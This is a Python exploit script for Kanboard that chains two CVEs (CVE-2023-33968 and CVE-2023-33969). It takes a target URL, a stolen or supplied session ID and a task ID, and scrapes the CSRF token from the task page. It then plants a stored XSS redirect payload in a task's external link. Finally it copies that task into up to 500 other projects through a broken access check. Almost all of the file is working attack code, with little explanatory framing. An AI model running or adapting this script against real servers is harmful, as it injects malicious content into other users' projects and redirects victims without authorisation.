# CVE-2023-33968 | https://github.com/kanboard/kanboard/security/advisories/GHSA-gf8r-4p6m-v8vr
# CVE-2023-33969 | https://github.com/kanboard/kanboard/security/advisories/GHSA-8qvf-9847-gpc9
import re
import sys
import requests

from yaspin import yaspin, Spinner
from colorama import Fore, Style
from requests_toolbelt.multipart.encoder import MultipartEncoder

# ==== IGNORE THIS, STATUS WITH COLORS (thanks chatgpt) ====

class Status():
    def success(): return f"{Style.BRIGHT}({Fore.GREEN}+{Style.RESET_ALL}{Style.BRIGHT}){Style.RESET_ALL}"
    def failure(): return f"{Style.BRIGHT}({Fore.RED}x{Style.RESET_ALL}{Style.BRIGHT}){Style.RESET_ALL}"
    def information(): return f"{Style.BRIGHT}({Fore.YELLOW}!{Style.RESET_ALL}{Style.BRIGHT}){Style.RESET_ALL}"
    def process(): return yaspin(Spinner([f"{Style.BRIGHT}({Fore.BLUE} {Style.RESET_ALL}{Style.BRIGHT}){Style.RESET_ALL}", 
                                 f"{Style.BRIGHT}({Fore.BLUE}/{Style.RESET_ALL}{Style.BRIGHT}){Style.RESET_ALL}", 
                                 f"{Style.BRIGHT}({Fore.BLUE}-{Style.RESET_ALL}{Style.BRIGHT}){Style.RESET_ALL}", 
                                 f"{Style.BRIGHT}({Fore.BLUE}\\{Style.RESET_ALL}{Style.BRIGHT}){Style.RESET_ALL}"],0.1))

# ===============================================
# Variables #

CSRF_TOKEN  = ""
TARGET_URL  = sys.argv[1]
SESSION_ID  = sys.argv[2]
MY_TASK_ID  = sys.argv[3]

MOVE_LINK   = f"{TARGET_URL}/?controller=TaskDuplicationController&action=copy&task_id={MY_TASK_ID}"
MY_TASK_URL = f"{TARGET_URL}/task/{MY_TASK_ID}"
CREATE_LINK = f"{TARGET_URL}/task/{MY_TASK_ID}/external-link/save"

XSS_PAYLOAD = '"><meta http-equiv="refresh" content="0; url=https://example.com/">'

def logo():
    print(f"""{Style.BRIGHT}
   __ __          ____                  
  / //_/__ ____  / __/__  _______ ___ __
 / ,< / _ `/ _ \_\ \/ _ \/ __/ _ `/ // /
/_/|_|\_,_/_//_/___/ .__/_/  \_,_/\_, / 
                  /_/            /___/  

{Status.information()} {Style.BRIGHT}CVE-2023-33968 + CVE-2023-33969 exploit by castilho{Style.RESET_ALL}""")

def get_csrf_token(response_html):
    
    # Extract CSRF token from the response HTML using regex
    csrf_token_regex = r'name="csrf_token" value="([^"]+)'
    match = re.search(csrf_token_regex, response_html)
    
    if match:
        csrf_token = match.group(1)
        print(f"\n{Status.success()} CSRF Token found = {csrf_token}")
        return csrf_token
    
    return ""

def generate_session():
    
    # Create a session with necessary headers and cookies
    session = requests.Session()
    headers = {'X-Requested-With': 'XMLHttpRequest'}
    session.headers.update(headers)
    session.cookies.update({'KB_SID': SESSION_ID})
    return session

def cve_2023_33968(session):
    
    projects_injected = 0
    
    with Status.process() as spinner:
        for i in range(1, 501):
            spinner.text = f"Spraying Malicious task through projects ..."
            
            multi_data = MultipartEncoder(
                fields={
                    'csrf_token': CSRF_TOKEN,
                    'id': '23',
                    'project_id': str(i),
                    'swimlane_id': '4',
                    'column_id': '13',
                    'category_id': '0',
                    'owner_id': '0',
                },
                boundary='----WebKitFormBoundaryBbdAu1Pf4Bb13i4C'
            )

            # POST request to create an internal link
            create_weblink_response = session.post(MOVE_LINK, headers={'Content-Type': multi_data.content_type}, data=multi_data)

            # Check if a task was found
            if len(create_weblink_response.content) == 0:
                projects_injected += 1
                
    spinner.text = ""
    spinner.ok(f"{Status.success()} Malicious task injected into {projects_injected}/100 projects!\n")

def cve_2023_33969(session):
    
    # Multipart data to create an internal link
    multi_data = MultipartEncoder(
    fields={
        'csrf_token': CSRF_TOKEN,
        'link_type': 'weblink',
        'url': XSS_PAYLOAD,
        'title': 'Login',
        'dependency': 'related'
    },
    boundary='----WebKitFormBoundaryCtGybLyA2twBIZAY'
)

    # POST request to create an internal link
    create_weblink_response = session.post(CREATE_LINK, headers={'Content-Type': multi_data.content_type}, data=multi_data)

    # Check if a task was found
    if len(create_weblink_response.content) == 0:
        print(f"{Status.success()} XSS payload injected into task with ID {MY_TASK_ID} ...")
    else:
        print(f"{Status.failure()} Couldn't inject XSS payload, check your task ID ...")
        exit()

def main():
    
    global CSRF_TOKEN
    
    logo()
    session = generate_session()
    my_task_response = session.get(MY_TASK_URL)
    CSRF_TOKEN = get_csrf_token(my_task_response.text)
    
    # Check if we could retrieve the CSRF Token
    if CSRF_TOKEN == "":
        print(f"{Status.failure()} Couldn't retrieve the CSRF Token, check your Session ID or Task ID...")
        exit()
        
    cve_2023_33969(session)
    cve_2023_33968(session)

if __name__ == '__main__':
    main()
    
